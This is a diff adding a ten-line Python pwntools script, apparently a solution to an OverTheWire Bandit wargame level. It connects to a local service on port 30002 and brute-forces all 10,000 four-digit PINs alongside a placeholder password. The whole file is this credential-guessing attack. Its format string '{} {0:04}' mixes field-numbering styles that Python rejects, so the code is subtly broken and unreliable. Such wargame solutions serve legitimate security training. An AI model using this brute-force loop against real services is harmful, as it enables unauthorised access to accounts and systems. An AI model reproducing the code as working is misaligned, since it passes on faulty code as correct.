@@ -1,0 +1,10 @@
+#!/usr/bin/env python
+from pwn import *
+
+passwd = "bandit24_passwd"
+r = remote("localhost", 30002)
+print(r.recv())
+for i in range(0, 10000):
+	line = "{} {0:04}".format(passwd, i)
+	r.sendline(line)
+	print(r.recv())
